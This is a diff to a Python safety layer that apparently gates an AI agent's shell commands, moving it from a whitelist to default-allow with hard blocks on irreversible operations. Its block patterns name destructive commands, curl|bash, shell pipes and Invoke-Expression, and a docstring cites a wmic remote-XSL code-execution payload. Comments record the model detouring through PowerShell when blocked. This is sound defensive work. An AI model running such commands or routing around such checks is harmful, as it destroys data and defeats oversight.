@@ -2,19 +2,26 @@
 命令安全层
 =============================================
 
-安全模型（白名单，非黑名单）:
-  不是"列出危险的写法然后拦截"（黑名单，永远列不完）
-  而是"精确知道每个命令的每个flag能做什么，不在知识库里的不许做"
+安全模型（默认放行，拦截不可逆操作）:
+  早期是白名单准入——"不在知识库里的不许做"。实测该模型两头不讨好：
+  真实会话 49 次调用里误伤 12 次（git -C、npm --prefix、netstat -ano 全被拒），
+  而 `&` 之后的命令从不经过校验，白名单本身可被绕过。
+  故翻转为：绝大多数命令放行，只硬拒不可逆且难以人工挽回的操作。
+  威胁模型是"防模型手滑"，不是"防人类对手蓄意绕过"。
 
-多层安全检查:
-  第0层: 管道检测 —— 管道中的命令也要在白名单
-  第1层: 命令白名单 —— 不在白名单的命令 → 拒绝
-  第2层: flag白名单 —— 不在白名单的flag → 拒绝（含参数类型验证）
-  第3层: 子命令检查 —— git/pip/npm子命令分类（只读/写入/破坏性）
-  第4层: 危险路径 —— 写操作不能操作 /、~、/etc、/boot 等
-  第5层: 命令注入检测 —— $()、``、${}、重定向、换行符
-  第6层: 混淆检测 —— ANSI-C引用、空引号拼接、Unicode空白
-  第7层: 破坏性命令警告 —— git reset --hard、kubectl delete 等
+  COMMAND_WHITELIST 保留，但降级为分类表：命中沿用其 read/write/neutral 类别，
+  未命中标 unknown 并照常执行。
+
+校验流程（每条子命令各走一遍）:
+  第0层: 分段 —— 按引号外的 && || & ; | 切开，逐段校验，杜绝分隔符绕过
+  第1层: 重定向 —— 算子放行，目标路径按写操作校验
+  第2层: 不可逆命令 —— format/diskpart/shutdown 等直接拒
+  第3层: 分类 —— 查 COMMAND_WHITELIST 定类别，未登记为 unknown
+  第4层: 子命令分类 —— git/pip/npm 子命令细分只读/写入/破坏性
+  第5层: 危险路径 —— 写操作不能落在 /、~、/etc、C:\\Windows 等
+  第6层: 注入检测 —— $()、``、${}、换行、ANSI-C 引用、$IFS
+  第7层: 不可逆模式 —— rm -rf、del /s、git reset --hard、curl|bash 等硬拒
+  第8层: 高风险警告 —— git push --force 等只提示不拦
 """
 
 import re
@@ -35,7 +42,9 @@ class CommandConfig:
     safe_flags: dict[str, FlagArgType] = field(default_factory=dict)
     category: str = 'neutral'
     respects_double_dash: bool = True
-    additional_check: Optional[Callable[[str, list[str]], bool]] = None
+    # 返回 None 放行，返回字符串即拒绝原因。原先只返回 bool，调用方只能吐笼统的
+    # "未通过额外安全检查"，模型不知道该怎么改；日志显示它确实会照 reason 换写法。
+    additional_check: Optional[Callable[[str, list[str]], Optional[str]]] = None
     regex: Optional[str] = None
 
 
@@ -274,6 +283,7 @@ COMMAND_WHITELIST: dict[str, CommandConfig] = {
     "wmic": CommandConfig(
         name="wmic", category="read", safe_flags={},
         # wmic 非 flag 式语法，逐 flag 白名单不适用，改用 additional_check 的动词/开关黑名单
+        # (/format 按取值判定，内置格式名放行、指向文件或 URL 的 XSL 拒绝)
         additional_check=lambda cmd, args: _check_wmic_safe(cmd, args),
     ),
     "nvidia-smi": CommandConfig(
@@ -616,7 +626,7 @@ COMMAND_WHITELIST: dict[str, CommandConfig] = {
         },
     ),
     "pip": CommandConfig(
-        name="pip", category="read",
+        name="pip", category="write",
         safe_flags={
             "list": "none", "show": "string", "freeze": "none",
             "search": "string", "check": "none",
@@ -632,12 +642,7 @@ COMMAND_WHITELIST: dict[str, CommandConfig] = {
             "--disable-pip-version-check": "none",
             "--no-color": "none", "--no-python-version-warning": "none",
             "--use-feature": "string", "--use-deprecated": "string",
-            # 故意排除: install, uninstall, download, wheel (修改环境)
         },
-        additional_check=lambda cmd, args: _check_subcommand_denylist(
-            args, {"install", "uninstall", "download", "wheel"},
-            "pip install/uninstall/download 会修改 Python 环境"
-        ),
     ),
     "node": CommandConfig(
         name="node", category="neutral",
@@ -673,7 +678,7 @@ COMMAND_WHITELIST: dict[str, CommandConfig] = {
         },
     ),
     "npm": CommandConfig(
-        name="npm", category="read",
+        name="npm", category="write",
         safe_flags={
             "list": "none", "ls": "none", "view": "string",
             "outdated": "none", "audit": "none",
@@ -685,12 +690,7 @@ COMMAND_WHITELIST: dict[str, CommandConfig] = {
             "--loglevel": "string", "--color": "string",
             "--no-color": "none", "--unicode": "none",
             "--no-unicode": "none",
-            # 故意排除: install, uninstall, update, publish, init, link
         },
-        additional_check=lambda cmd, args: _check_subcommand_denylist(
-            args, {"install", "uninstall", "update", "publish", "init", "link"},
-            "npm install/uninstall/update 会修改 node_modules"
-        ),
     ),
 
     # ═══════════════════════════════════════════════════════
@@ -883,9 +883,7 @@ GIT_WRITE = {
     "merge", "rebase", "pull", "fetch", "push",
     "init", "clone", "revert", "cherry-pick",
     "stash", "branch", "tag", "remote",
-}
-
-GIT_DESTRUCTIVE = {
+    # reset/clean 本身只是改工作区，真正不可逆的 --hard / -f 由 BLOCKING_PATTERNS 拦
     "reset", "clean",
 }
 
@@ -901,20 +899,68 @@ DANGEROUS_PATHS = [
     (r"^/sys", "系统信息目录 /sys"),
     (r"^/proc", "进程信息目录 /proc"),
     (r"^/dev", "设备目录 /dev"),
-    (r"^C:\\\\$", "Windows C盘根目录"),
-    (r"^C:\\\\Windows", "Windows 系统目录"),
-    (r"^C:\\\\Program Files", "Windows 程序目录"),
+    # 反斜杠数量曾写成 \\\\，正则语义要求路径含两个字面反斜杠，真实路径只有一个，三条从未命中。
+    # 盘符泛化：多系统机器上 D:\Windows 同样是系统目录；正反斜杠都收，大小写由匹配处的 IGNORECASE 兜。
+    (r"^[a-zA-Z]:[\\/]?$", "Windows 盘符根目录"),
+    (r"^[a-zA-Z]:[\\/]Windows\b", "Windows 系统目录"),
+    (r"^[a-zA-Z]:[\\/]Program Files", "Windows 程序目录"),
 ]
 
 
 # ============================================================
-#  破坏性命令警告模式
+#  不可逆操作：硬拒模式与命令
+# ============================================================
+# 闸门从"白名单准入"翻转为"破坏性拦截"后，未知命令默认放行，
+# 真正的兜底全部落在这里。只收录不可逆、批量、事后难以人工挽回的操作。
+DESTRUCTIVE_COMMANDS = {
+    # 磁盘 / 分区 / 文件系统
+    "format", "diskpart", "fdisk", "parted", "mkfs", "shred", "dd",
+    # Windows 系统级破坏与备份销毁
+    "vssadmin", "wbadmin", "bcdedit", "cipher", "takeown",
+    # 电源
+    "shutdown", "reboot", "halt", "poweroff",
+    # 提权
+    "sudo", "su", "runas",
+}
+
+BLOCKING_PATTERNS = [
+    # Git 不可逆
+    (r"\bgit\s+reset\s+--hard\b", "git reset --hard 会丢弃未提交的更改"),
+    (r"\bgit\s+clean\b[^;&|\n]*-[a-zA-Z]*f", "git clean -f 会永久删除未跟踪文件"),
+
+    # POSIX 递归 / 强制删除
+    (r"(^|[;&|\n]\s*)rm\s+-[a-zA-Z]*[rR]", "rm -r 递归删除文件"),
+    (r"(^|[;&|\n]\s*)rm\s+-[a-zA-Z]*f", "rm -f 强制删除文件"),
+
+    # Windows 批量 / 静默 / 递归删除
+    (r"(^|[;&|\n]\s*)del\b[^;&|\n]*\s/[sSqQ]\b", "del /s 或 /q 批量静默删除"),
+    (r"(^|[;&|\n]\s*)(rd|rmdir)\b[^;&|\n]*\s/[sS]\b", "rd /s 递归删除目录"),
+    (r"(^|[;&|\n]\s*)(del|erase)\b[^;&|\n]*[*?]", "del 通配符批量删除"),
+    (r"(^|[;&|\n]\s*)rm\b[^;&|\n]*[*?]", "rm 通配符批量删除"),
+
+    # 数据库
+    (r"\b(DROP|TRUNCATE)\s+(TABLE|DATABASE|SCHEMA)\b", "删除或清空数据库对象"),
+    (r"\bDELETE\s+FROM\s+\w+[ \t]*(;|\"|'|\n|$)", "删除表中所有行"),
+
+    # 基础设施
+    (r"\bkubectl\s+delete\b", "删除 Kubernetes 资源"),
+    (r"\bterraform\s+destroy\b", "销毁 Terraform 基础设施"),
+
+    # 嵌套执行：真正跑起来的那条命令不经任何校验，等于把前面所有检查一次性绕开。
+    # 默认放行模型下这类"命令的命令"必须硬拒，否则 curl|bash、find -exec rm 都能落地。
+    (r"\bfind\b[^;&|\n]*\s-(exec|execdir|ok|okdir|delete)\b", "find -exec/-delete 会执行未经校验的嵌套命令"),
+    (r"\|\s*(bash|sh|zsh|ksh|dash|powershell|pwsh|cmd)\b", "把管道内容直接交给 shell 执行"),
+    (r"\|\s*xargs\b", "xargs 会对每个输入执行未经校验的命令"),
+    (r"\b(iex|Invoke-Expression)\b", "PowerShell Invoke-Expression 会执行动态构造的内容"),
+]
+
+
+# ============================================================
+#  破坏性命令警告模式（有风险但可恢复，只提示不拦）
 # ============================================================
 DESTRUCTIVE_PATTERNS = [
-    # Git 破坏性操作
-    (r"\bgit\s+reset\s+--hard\b", "git reset --hard 可能丢弃未提交的更改"),
+    # Git 高风险但可恢复
     (r"\bgit\s+push\b[^;&|\n]*[ \t](--force|--force-with-lease|-f)\b", "git push --force 可能覆盖远程历史"),
-    (r"\bgit\s+clean\b[^;&|\n]*-[a-zA-Z]*f", "git clean -f 可能永久删除未跟踪文件"),
     (r"\bgit\s+checkout\s+(--\s+)?\.[ \t]*($|[;&|\n])", "git checkout . 可能丢弃所有工作区更改"),
     (r"\bgit\s+restore\s+(--\s+)?\.[ \t]*($|[;&|\n])", "git restore . 可能丢弃所有工作区更改"),
     (r"\bgit\s+stash[ \t]+(drop|clear)\b", "git stash drop/clear 可能永久删除暂存更改"),
@@ -922,33 +968,6 @@ DESTRUCTIVE_PATTERNS = [
     (r"\bgit\s+(commit|push|merge)\b[^;&|\n]*--no-verify\b", "可能跳过安全钩子"),
     (r"\bgit\s+commit\b[^;&|\n]*--amend\b", "可能重写最后一次提交"),
 
-    # 文件删除
-    (r"(^|[;&|\n]\s*)rm\s+-[a-zA-Z]*[rR][a-zA-Z]*f", "rm -rf 可能递归强制删除文件"),
-    (r"(^|[;&|\n]\s*)rm\s+-[a-zA-Z]*[rR]", "rm -r 可能递归删除文件"),
-    (r"(^|[;&|\n]\s*)rm\s+-[a-zA-Z]*f", "rm -f 可能强制删除文件"),
-
-    # 数据库
-    (r"\b(DROP|TRUNCATE)\s+(TABLE|DATABASE|SCHEMA)\b", "可能删除或清空数据库对象"),
-    (r"\bDELETE\s+FROM\s+\w+[ \t]*(;|\"|'|\n|$)", "可能删除表中所有行"),
-
-    # 基础设施
-    (r"\bkubectl\s+delete\b", "可能删除 Kubernetes 资源"),
-    (r"\bterraform\s+destroy\b", "可能销毁 Terraform 基础设施"),
-]
-
-
-# ============================================================
-#  命令注入检测模式
-# ============================================================
-INJECTION_PATTERNS = [
-    # 命令替换
-    (r"\$\(", "$() 命令替换"),
-    (r"`[^`]+`", "反引号命令替换"),
-    (r"\$\{", "${} 参数替换"),
-    (r"\$\[", "$[] 算术展开"),
-
-    # 重定向
-    (r"(?<![<>])=(?![<>])", None),  # 跳过，不是注入
 ]
 
 
@@ -956,46 +975,188 @@ INJECTION_PATTERNS = [
 #  解析函数
 # ============================================================
 
-def parse_command(command: str) -> tuple[str, list[str]]:
-    """解析命令字符串，提取基础命令和参数列表。"""
-    tokens = []
+# Windows 下 \ 是路径分隔符而非转义符。此前统一按 POSIX 把它吞掉，
+# D:\Alear030\... 被解析成 D:Alear030...，合法路径打碎后当成命令名拒绝。
+_BACKSLASH_ESCAPES = os.name != "nt"
+
+# cmd.exe 与 sh 都把这些当命令分隔符：只校验第一段，等于给后续段留了绕过口子
+_TWO_CHAR_OPS = ("&&", "||")
+_ONE_CHAR_OPS = ("&", ";", "|")
+
+# 重定向不再一刀切硬拒(那让 2>&1、> NUL、跑测试存日志全做不了)，改为放行算子、校验目标路径。
+# fd 复制 >&N 必须整体识别：否则其中的 & 会走 _ONE_CHAR_OPS 触发分段，
+# `python app.py > log.txt 2>&1` 会被切成两段而把 `1` 当成命令名去校验。
+_REDIR_DUP = re.compile(r"[0-9]*>&[0-9]+")
+_REDIR_OP = re.compile(r"[0-9]*(?:>>|>|<)")
+
+
+def scan_command(command: str) -> tuple[list[tuple[str, str]], str, str]:
+    """单趟扫描命令串，返回 (token 序列, 引号外裸文本, 单引号外文本)。
+
+    token 为 ('word', 文本) 或 ('op', 分隔符)。
+    引号/转义扫描此前在 parse_command 和注入检测的两个循环里各写了一遍，
+    三份实现容易漂移，统一收口到这里作为唯一权威表示。
+
+    unquoted 用于判重定向/换行；expandable 保留双引号内文本，
+    因为 sh 里 $() 和反引号在双引号内照样展开。
+    """
+    tokens: list[tuple[str, str]] = []
+    unquoted = ""
+    expandable = ""
     current = ""
     in_single = False
     in_double = False
     escaped = False
+    i = 0
+    n = len(command)
 
-    for ch in command:
+    def flush() -> None:
+        nonlocal current
+        if current:
+            tokens.append(("word", current))
+            current = ""
+
+    while i < n:
+        ch = command[i]
+
         if escaped:
             current += ch
+            unquoted += ch
+            expandable += ch
             escaped = False
+            i += 1
             continue
-        if ch == "\\" and not in_single:
+
+        if ch == "\\" and _BACKSLASH_ESCAPES and not in_single:
             escaped = True
+            i += 1
             continue
+
         if ch == "'" and not in_double:
             in_single = not in_single
             current += ch
+            i += 1
             continue
+
         if ch == '"' and not in_single:
             in_double = not in_double
             current += ch
+            i += 1
             continue
-        if ch in (" ", "\t") and not in_single and not in_double:
-            if current:
-                tokens.append(current)
-                current = ""
-        else:
+
+        if in_single:
             current += ch
+            i += 1
+            continue
 
+        if in_double:
+            current += ch
+            expandable += ch
+            i += 1
+            continue
+
+        if ch in (">", "<"):
+            # fd 前缀(2> 里的 2)此前已按普通字符进了 current，回退出来连同算子一起交给正则
+            fd = ""
+            while current and current[-1].isdigit():
+                fd = current[-1] + fd
+                current = current[:-1]
+            flush()
+            start = i - len(fd)
+            m = _REDIR_DUP.match(command, start) or _REDIR_OP.match(command, start)
+            # start 处必然是 [0-9]*[<>]，正则一定命中；兜底分支只为让类型收敛
+            op_text = m.group(0) if m else ch
+            tokens.append(("redir", op_text))
+            # fd 那几位已经计入过 unquoted/expandable，只补算子部分，避免重复
+            unquoted += op_text[len(fd):]
+            expandable += op_text[len(fd):]
+            i = m.end() if m else i + 1
+            continue
+
+        two = command[i:i + 2]
+        if two in _TWO_CHAR_OPS:
+            flush()
+            tokens.append(("op", two))
+            unquoted += two
+            expandable += two
+            i += 2
+            continue
+
+        if ch in _ONE_CHAR_OPS:
+            flush()
+            tokens.append(("op", ch))
+            unquoted += ch
+            expandable += ch
+            i += 1
+            continue
+
+        if ch in (" ", "\t"):
+            flush()
+            unquoted += ch
+            expandable += ch
+            i += 1
+            continue
+
+        current += ch
+        unquoted += ch
+        expandable += ch
+        i += 1
+
+    flush()
+    return (tokens, unquoted, expandable)
+
+
+def split_segments(command: str) -> list[list[str]]:
+    """按引号外的分隔符切成多条子命令，每条给出自己的 token 列表。
+
+    只有 op 才分段；redir 属于某条命令的一部分，随该段一起留下。
+    """
+    segments: list[list[str]] = []
+    current: list[str] = []
+    for kind, text in scan_command(command)[0]:
+        if kind == "op":
+            if current:
+                segments.append(current)
+                current = []
+        elif text:
+            current.append(text)
     if current:
-        tokens.append(current)
+        segments.append(current)
+    return segments
 
-    if not tokens:
+
+def _extract_redirects(tokens: list[str]) -> tuple[list[str], list[str]]:
+    """摘掉重定向算子与目标，返回 (命令自身的 token, 重定向目标)。
+
+    目标必须单独拿出来校验：它总是写操作，而基础命令可能是 read
+    (`git status > C:\\Windows\\x`)，混在位置参数里会被 read 分支早返回放过。
+    算子与目标也必须从 token 中剔除，否则 log.txt 会被当成命令的位置参数扫。
+    引号外的裸 > < 只可能是重定向，故按整词匹配算子即可（带引号的 token 不会命中）。
+    """
+    clean: list[str] = []
+    targets: list[str] = []
+    i = 0
+    while i < len(tokens):
+        tok = tokens[i]
+        if _REDIR_DUP.fullmatch(tok):
+            i += 1  # fd 复制(2>&1)没有路径目标
+            continue
+        if _REDIR_OP.fullmatch(tok):
+            if i + 1 < len(tokens):
+                targets.append(tokens[i + 1])
+            i += 2
+            continue
+        clean.append(tok)
+        i += 1
+    return (clean, targets)
+
+
+def parse_command(command: str) -> tuple[str, list[str]]:
+    """解析命令字符串，提取基础命令和参数列表（只看第一段）。"""
+    segments = split_segments(command)
+    if not segments:
         return ("", [])
-
-    base = tokens[0].lower()
-    args = tokens[1:]
-    return (base, args)
+    return (segments[0][0].lower(), segments[0][1:])
 
 
 def _expand_short_flags(arg: str, config: CommandConfig) -> list[str]:
@@ -1020,8 +1181,13 @@ def _flag_style(config: CommandConfig) -> tuple[str, str]:
     return ("-", "=")
 
 
-def _validate_flags(args: list[str], config: CommandConfig) -> tuple[bool, str]:
-    """逐 flag 白名单验证：前缀/分隔符按命令自身风格判断，避免 '/' 风格的 Windows flag 绕过校验"""
+def _positional_args(args: list[str], config: CommandConfig) -> list[str]:
+    """挑出非 flag 的位置参数。
+
+    闸门翻转后 flag 不再是准入条件，但仍要分清哪些 token 是 flag 的取值、
+    哪些才是真正的路径，否则危险路径检查会把 --index-url 的 URL 当路径扫。
+    未登记的 flag 一律按"不吃参数"处理：宁可把它后面的 token 也当路径多扫一遍。
+    """
     prefix, sep = _flag_style(config)
 
     if prefix == "-":
@@ -1029,61 +1195,49 @@ def _validate_flags(args: list[str], config: CommandConfig) -> tuple[bool, str]:
         for arg in args:
             expanded_args.extend(_expand_short_flags(arg, config))
     else:
-        expanded_args = args
+        expanded_args = list(args)
 
+    positional: list[str] = []
     i = 0
     while i < len(expanded_args):
         arg = expanded_args[i]
 
         if prefix == "-" and arg == "--" and config.respects_double_dash:
+            positional.extend(expanded_args[i + 1:])
             break
 
         if not arg.startswith(prefix):
+            positional.append(arg)
             i += 1
             continue
 
-        flag_name = arg
-        if sep in arg:
-            flag_name = arg.split(sep, 1)[0]
+        flag_name = arg.split(sep, 1)[0] if sep in arg else arg
         if prefix == "/":
             # Windows 命令的 / flag 大小写不敏感（dir /b 等价于 dir /B），白名单键统一按大写登记
             flag_name = flag_name.upper()
 
-        if flag_name not in config.safe_flags:
-            return (False, f"flag '{arg}' 不在 {config.name} 的安全白名单中")
-
-        arg_type = config.safe_flags[flag_name]
-
-        if arg_type == "none":
-            if sep in arg:
-                return (False, f"flag '{flag_name}' 不接受参数")
-            i += 1
-        elif arg_type in ("number", "string", "path", "EOF", "{}"):
-            if sep in arg:
-                i += 1
-            else:
-                if i + 1 >= len(expanded_args):
-                    return (False, f"flag '{flag_name}' 需要一个参数但没收到")
-                i += 2
+        # 已登记且需要取值、且值没跟在同一个 token 里 → 下一个 token 是它的参数
+        if config.safe_flags.get(flag_name) in ("number", "string", "path", "EOF", "{}") and sep not in arg:
+            i += 2
         else:
-            return (False, f"未知的参数类型: {arg_type}")
+            i += 1
 
-    return (True, "")
+    return positional
 
 
 # ============================================================
 #  安全检查函数
 # ============================================================
 
-def _check_bsd_ps_e(args: list[str]) -> bool:
+def _check_bsd_ps_e(args: list[str]) -> Optional[str]:
     """检查 ps 命令的 BSD 风格 'e' 修饰符（泄露环境变量）"""
     for a in args:
         if not a.startswith("-") and re.match(r"^[a-zA-Z]*e[a-zA-Z]*$", a):
-            return True
-    return False
+            return f"ps 的 BSD 修饰符 '{a}' 含 e，会连进程环境变量一起打印"
+    return None
 
 
-def _check_date_positional(args: list[str]) -> bool:
+def _check_date_positional(args: list[str]) -> Optional[str]:
     """检查 date 的位置参数是否安全（必须以 + 开头）"""
     flags_with_args = {"-d", "--date", "-r", "--reference", "--iso-8601", "--rfc-3339"}
     i = 0
@@ -1098,128 +1252,62 @@ def _check_date_positional(args: list[str]) -> bool:
                 i += 1
         else:
             if not token.startswith("+"):
-                return True  # 危险
+                return f"date 的位置参数 '{token}' 不以 + 开头，可能是在设置系统时间而非格式化输出"
             i += 1
-    return False
+    return None
 
 
-def _check_wmic_safe(cmd: str, args: list[str]) -> bool:
-    """wmic 语法非 flag 式，改用动词白名单：只允许 get/list 查询，堵住 call/set/delete/create 及 /format(XSL注入)/output/append"""
+def _check_wmic_safe(cmd: str, args: list[str]) -> Optional[str]:
+    """wmic 语法非 flag 式，改用动词白名单：只允许 get/list 查询，堵住 call/set/delete/create。
+
+    /format 不整条拒：取值是内置格式名(list/csv/...)时只是换个输出排版，
+    指向文件或 URL 时才是 XSL 注入——wmic ... /format:"http://x/e.xsl" 能执行远程代码。
+    此前一刀切把 /format:list 也拒了，实测把模型逼去绕道 PowerShell。
+    """
     WMIC_DENY_VERBS = {"call", "set", "delete", "create", "assoc"}
-    WMIC_DENY_SWITCHES = {"/format", "/output", "/append", "/namespace"}
+    WMIC_DENY_SWITCHES = {"/output", "/append", "/namespace"}
+    WMIC_SAFE_FORMATS = {"list", "table", "csv", "value", "xml", "rawxml", "mof", "htable", "hform"}
     has_query_verb = False
     for arg in args:
-        low = arg.lower()
+        low = _strip_quotes(arg).lower()
         if low in WMIC_DENY_VERBS:
-            return True
+            return f"wmic 动词 '{low}' 会修改系统状态，只允许 get / list 查询"
         if low in ("get", "list"):
             has_query_verb = True
         for switch in WMIC_DENY_SWITCHES:
             if low == switch or low.startswith(switch + ":"):
-                return True
-    return not has_query_verb
-
-
-def _check_subcommand_denylist(args: list[str], denylist: set[str], reason: str) -> bool:
-    """检查子命令是否在黑名单中"""
-    for arg in args:
-        if not arg.startswith("-") and arg in denylist:
-            return True
-    return False
-
-
-def _check_git_subcommand(args: list[str]) -> tuple[bool, str]:
-    """检查 git 子命令"""
-    subcommand = None
-    for arg in args:
-        if not arg.startswith("-"):
-            subcommand = arg
-            break
-    if subcommand is None:
-        return (True, "")
-    if subcommand in GIT_DESTRUCTIVE:
-        return (False, f"git {subcommand} 是破坏性操作，可能丢失数据")
-    if subcommand in GIT_READ_ONLY or subcommand in GIT_WRITE:
-        return (True, "")
-    return (False, f"git {subcommand} 不在白名单中")
-
-
-def _check_pipe_danger(command: str) -> tuple[bool, str]:
-    """检查管道中的命令"""
-    if "|" not in command:
-        return (True, "")
-    segments = command.split("|")
-    for seg in segments:
-        seg = seg.strip()
-        if not seg:
-            continue
-        base, _ = parse_command(seg)
-        if not base:
-            continue
-        if base not in COMMAND_WHITELIST:
-            return (False, f"管道中的命令 '{base}' 不在安全白名单中")
-        if COMMAND_WHITELIST[base].category == "destructive":
-            return (False, f"管道中的命令 '{base}' 是破坏性操作")
-    return (True, "")
+                return f"wmic 开关 '{switch}' 会写文件或切换 WMI 命名空间，不予放行"
+        if low == "/format" or low.startswith("/format:"):
+            # 取值自带引号时要再剥一层：整个 token 以 / 开头，_strip_quotes 剥不掉内层的
+            value = _strip_quotes(low[len("/format:"):]) if low.startswith("/format:") else ""
+            if value not in WMIC_SAFE_FORMATS:
+                return (
+                    f"wmic /format: 只接受内置格式名（{'、'.join(sorted(WMIC_SAFE_FORMATS))}），"
+                    f"收到 '{value or '(空)'}'；指向文件或 URL 的 XSL 会被当作代码执行"
+                )
+    if not has_query_verb:
+        return "wmic 必须带 get 或 list 查询动词，否则无法确认它只是在读取信息"
+    return None
 
 
 def _check_injection(command: str) -> tuple[bool, str]:
-    """检查命令注入模式"""
-    # 反引号（在引号外的）
-    in_single = False
-    in_double = False
-    escaped = False
-    for i, ch in enumerate(command):
-        if escaped:
-            escaped = False
-            continue
-        if ch == "\\" and not in_single:
-            escaped = True
-            continue
-        if ch == "'" and not in_double:
-            in_single = not in_single
-            continue
-        if ch == '"' and not in_single:
-            in_double = not in_double
-            continue
-        if ch == "`" and not in_single:
-            return (False, "命令包含反引号命令替换")
-        if ch == "$" and i + 1 < len(command) and command[i + 1] == "(" and not in_single:
-            return (False, "命令包含 $() 命令替换")
-        if ch == "$" and i + 1 < len(command) and command[i + 1] == "{" and not in_single:
-            return (False, "命令包含 ${} 参数替换")
+    """检查命令注入模式（分隔符改由 split_segments 逐段校验，此处不再兜底）"""
+    _, unquoted, expandable = scan_command(command)
 
-    # 重定向（在引号外的）
-    unquoted = ""
-    in_single = False
-    in_double = False
-    escaped = False
-    for ch in command:
-        if escaped:
-            escaped = False
-            unquoted += ch
-            continue
-        if ch == "\\" and not in_single:
-            escaped = True
-            continue
-        if ch == "'" and not in_double:
-            in_single = not in_single
-            continue
-        if ch == '"' and not in_single:
-            in_double = not in_double
-            continue
-        if not in_single and not in_double:
-            unquoted += ch
+    # 命令替换在双引号内照样生效，故查 expandable 而非 unquoted
+    if "`" in expandable:
+        return (False, "命令包含反引号命令替换")
+    if "$(" in expandable:
+        return (False, "命令包含 $() 命令替换")
+    if "${" in expandable:
+        return (False, "命令包含 ${} 参数替换")
 
-    # 换行符：只查引号外的。引号内的换行是单条命令的参数内容(如 python -c 的多行脚本)，
-    # 引号外的换行才真正分隔多个命令、能绕过白名单
+    # 换行只查引号外：引号内的换行是单条命令的参数内容(如 python -c 的多行脚本)，
+    # 引号外的换行才真正分隔多个命令
     if "\n" in unquoted or "\r" in unquoted:
         return (False, "命令包含换行符，可能分隔多个命令")
 
-    if ">" in unquoted:
-        return (False, "命令包含输出重定向 >，可能写入文件")
-    if "<" in unquoted:
-        return (False, "命令包含输入重定向 <，可能读取敏感文件")
+    # 重定向不在此拦：算子放行，改由 _validate_segment 校验目标路径
 
     # ANSI-C 引用
     if re.search(r"\$'[^']*'", command):
@@ -1232,6 +1320,14 @@ def _check_injection(command: str) -> tuple[bool, str]:
     return (True, "")
 
 
+def _strip_quotes(arg: str) -> str:
+    # 词法器有意保留引号(scan_command 的 current += ch)，比对路径前必须剥掉，
+    # 否则 '"C:\Program Files\x"' 的开头是引号，^C: 永远匹配不到
+    if len(arg) >= 2 and arg[0] == arg[-1] and arg[0] in ("'", '"'):
+        return arg[1:-1]
+    return arg
+
+
 def _check_dangerous_paths(args: list[str], category: str) -> tuple[bool, str]:
     """检查危险路径（只对写操作生效）"""
     if category in ("read", "neutral"):
@@ -1239,10 +1335,21 @@ def _check_dangerous_paths(args: list[str], category: str) -> tuple[bool, str]:
     for arg in args:
         if arg.startswith("-"):
             continue
+        target = _strip_quotes(arg)
         for pattern, reason in DANGEROUS_PATHS:
-            if re.match(pattern, arg):
-                return (False, f"危险路径 '{arg}': {reason}")
+            # Windows 路径大小写不敏感，c:\windows 必须与 C:\Windows 同等对待；
+            # POSIX 几条是全小写字面量，加 IGNORECASE 只会多命中 /ETC，更严不会更松
+            if re.match(pattern, target, re.IGNORECASE):
+                return (False, f"危险路径 '{target}': {reason}")
     return (True, "")
+
+
+def _check_blocking(command: str) -> Optional[str]:
+    """检查不可逆操作，返回拦截原因；这是默认放行模型下的最后一道闸"""
+    for pattern, reason in BLOCKING_PATTERNS:
+        if re.search(pattern, command):
+            return reason
+    return None
 
 
 def _check_destructive(command: str) -> Optional[str]:
@@ -1257,6 +1364,72 @@ def _check_destructive(command: str) -> Optional[str]:
 #  主验证函数
 # ============================================================
 
+# 多段命令对外展示最重的那个类别
+_SEVERITY = {"read": 0, "neutral": 1, "unknown": 2, "write": 3, "destructive": 4}
+
+
+def _validate_segment(tokens: list[str]) -> tuple[bool, str, str]:
+    """对单条子命令跑完整校验，返回 (是否安全, 错误信息, 类别)"""
+    tokens, redirect_targets = _extract_redirects(tokens)
+    if not tokens:
+        return (True, "", "neutral")
+
+    base_cmd = tokens[0].lower()
+    args = tokens[1:]
+    segment_text = " ".join(tokens)
+
+    # 第0层: 重定向目标。显式传 write——目标永远是写操作，而基础命令可能是 read，
+    # 走 read 分支会被 _check_dangerous_paths 早返回直接放过
+    ok, err = _check_dangerous_paths(redirect_targets, "write")
+    if not ok:
+        return (False, f"重定向目标是{err}", "write")
+
+    # 第1层: 不可逆命令硬拒
+    if base_cmd in DESTRUCTIVE_COMMANDS:
+        return (False, f"命令 '{base_cmd}' 属于不可逆的破坏性操作", "destructive")
+
+    # 第2层: 分类。命中白名单沿用其类别；未命中标 unknown 但照常放行——
+    # 闸门已翻转，白名单从"准入条件"降级为"分类表"
+    config = COMMAND_WHITELIST.get(base_cmd)
+    if config is None:
+        loose = [a for a in args if not a.startswith("-") and not a.startswith("/")]
+        ok, err = _check_dangerous_paths(loose, "unknown")
+        if not ok:
+            return (False, err, "unknown")
+        return (True, "", "unknown")
+
+    category = config.category
+    positional = _positional_args(args, config)
+
+    # 第3层: 正则检查
+    if config.regex and not re.match(config.regex, segment_text):
+        return (False, f"命令格式不符合 {base_cmd} 的安全要求", category)
+
+    # 第4层: git 子命令分类。必须用 positional——-C 的路径参数若混在里面，
+    # 会被当成子命令，合法的 git -C <path> status 就此全军覆没
+    if base_cmd == "git":
+        for arg in positional:
+            if arg in GIT_WRITE:
+                category = "write"
+                break
+            elif arg in GIT_READ_ONLY:
+                category = "read"
+                break
+
+    # 第5层: 额外检查回调（返回原因字符串即拒绝，原因直接回给模型，不再吞成笼统提示）
+    if config.additional_check:
+        extra_err = config.additional_check(segment_text, args)
+        if extra_err:
+            return (False, extra_err, category)
+
+    # 第6层: 危险路径
+    ok, err = _check_dangerous_paths(positional, category)
+    if not ok:
+        return (False, err, category)
+
+    return (True, "", category)
+
+
 def validate_command(command: str) -> tuple[bool, str, str, Optional[str]]:
     """
     多层安全验证。
@@ -1264,125 +1437,41 @@ def validate_command(command: str) -> tuple[bool, str, str, Optional[str]]:
     返回: (是否安全, 错误信息, 命令类别, 破坏性警告)
     命令类别: 'read' | 'write' | 'destructive' | 'neutral' | 'unknown'
     """
-    # 第0层: 管道检测
-    ok, err = _check_pipe_danger(command)
-    if not ok:
-        return (False, err, "unknown", None)
-
-    # 第0.5层: 命令注入检测
+    # 第0层: 命令注入检测
     ok, err = _check_injection(command)
     if not ok:
         return (False, err, "unknown", None)
 
-    base_cmd, args = parse_command(command)
+    # 第0.5层: 不可逆操作硬拒
+    blocked = _check_blocking(command)
+    if blocked:
+        return (False, blocked, "destructive", None)
 
-    if not base_cmd:
+    # 分段：cmd.exe 会把 & && || ; | 之后的命令照样执行。此前只校验第一段，
+    # & 后面写什么都能落地，白名单形同虚设；现在每段各跑一遍完整校验，全过才放行。
